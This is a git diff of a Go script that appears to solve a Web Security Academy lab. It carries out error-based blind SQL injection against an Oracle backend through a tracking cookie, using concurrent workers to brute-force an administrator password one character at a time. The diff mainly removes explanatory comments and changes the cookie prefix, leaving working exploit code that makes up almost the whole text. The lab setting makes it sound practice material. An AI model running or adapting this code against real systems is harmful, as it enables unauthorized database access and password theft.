@@ -26,17 +26,15 @@ import (
 	"time"
 )
 
-// Configuration
 const (
 	TargetURL   = "https://0ab000cf04ce1f4e8083082400a00081.web-security-academy.net/"
 	PasswordLen = 20
-	MaxWorkers  = 20 // 20 is sufficient; too many might trigger WAF or rate limits
+	MaxWorkers  = 20 
 	Charset     = "abcdefghijklmnopqrstuvwxyz0123456789"
 )
 
-// Global HTTP client optimized for connection reuse
 var client = &http.Client{
-	Timeout: 5 * time.Second, // Fail fast if server hangs
+	Timeout: 5 * time.Second,
 	Transport: &http.Transport{
 		MaxIdleConns:        100,
 		MaxIdleConnsPerHost: 100,
@@ -45,7 +43,6 @@ var client = &http.Client{
 }
 
 func main() {
-	// Handle graceful shutdown (Ctrl+C)
 	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
 	defer stop()
 
@@ -56,7 +53,6 @@ func main() {
 
 	start := time.Now()
 
-	// Iterate through each password position
 	for i := 1; i <= PasswordLen; i++ {
 		char, found := findCharForPosition(ctx, i)
 		if !found {
@@ -64,7 +60,6 @@ func main() {
 			break
 		}
 		password[i-1] = char
-		// Print discovered character immediately
 		fmt.Printf("\r[+] Found char %d/%d: %c                \n", i, PasswordLen, char)
 	}
 
@@ -73,9 +68,7 @@ func main() {
 	fmt.Printf("[*] Time Elapsed: %s\n", time.Since(start))
 }
 
-// findCharForPosition orchestrates the worker pool for a single character position
 func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
-	// Context for this specific position; allows cancelling all workers once found
 	posCtx, cancel := context.WithCancel(ctx)
 	defer cancel()
 
@@ -83,7 +76,6 @@ func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
 	results := make(chan rune)
 	var wg sync.WaitGroup
 
-	// Spin up workers
 	for w := 0; w < MaxWorkers; w++ {
 		wg.Add(1)
 		go func() {
@@ -92,7 +84,6 @@ func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
 		}()
 	}
 
-	// Feed the workers
 	go func() {
 		for _, char := range Charset {
 			select {
@@ -104,13 +95,11 @@ func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
 		close(jobs)
 	}()
 
-	// Wait for result or completion
 	go func() {
 		wg.Wait()
 		close(results)
 	}()
 
-	// Update UI while waiting for result
 	ticker := time.NewTicker(100 * time.Millisecond)
 	defer ticker.Stop()
 
@@ -118,11 +107,11 @@ func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
 		select {
 		case res, ok := <-results:
 			if !ok {
-				return 0, false // Channel closed, nothing found
+				return 0, false
 			}
-			return res, true // Found the char
+			return res, true
 		case <-ctx.Done():
-			return 0, false // Main context cancelled
+			return 0, false
 		case <-ticker.C:
 			fmt.Printf("\r[*] Brute forcing position %d...", pos)
 		}
@@ -131,7 +120,6 @@ func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
 
 func worker(ctx context.Context, pos int, jobs <-chan rune, results chan<- rune) {
 	for char := range jobs {
-		// Check context before making request
 		if ctx.Err() != nil {
 			return
 		}
@@ -147,7 +135,6 @@ func worker(ctx context.Context, pos int, jobs <-chan rune, results chan<- rune)
 	}
 }
 
-// performAttack sends the payload and returns true if the server responds with 500 (Internal Server Error)
 func performAttack(ctx context.Context, pos int, char rune) bool {
 	// Oracle SQL Payload: 
 	// If the character matches, we trigger a divide-by-zero error (1/0).
@@ -157,17 +144,11 @@ func performAttack(ctx context.Context, pos int, char rune) bool {
 		pos, char,
 	)
 
-	// Construct the Injection
-	// We inject into the TrackingId cookie. We close the previous quote with '
-	// Then add our AND condition.
 	injection := fmt.Sprintf("' AND %s--", sqlPayload)
 	
-	// We only URL encode the injection part to ensure transmission safety
-	// Note: We need to replace + with %20 because standard QueryEscape uses + for spaces
 	encodedInjection := strings.ReplaceAll(url.QueryEscape(injection), "+", "%20")
 	
-	// Base cookie value (arbitrary string to close the initial query)
-	cookieVal := "AccessId" + encodedInjection
+	cookieVal := "0xPelamar" + encodedInjection
 
 	req, err := http.NewRequestWithContext(ctx, "GET", TargetURL, nil)
 	if err != nil {
@@ -182,7 +163,6 @@ func performAttack(ctx context.Context, pos int, char rune) bool {
 	}
 	defer resp.Body.Close()
 
-	// In this lab, Status 500 means our 'CASE WHEN' hit the '1/0' logic -> Character Match
 	return resp.StatusCode == http.StatusInternalServerError
 }
 ```
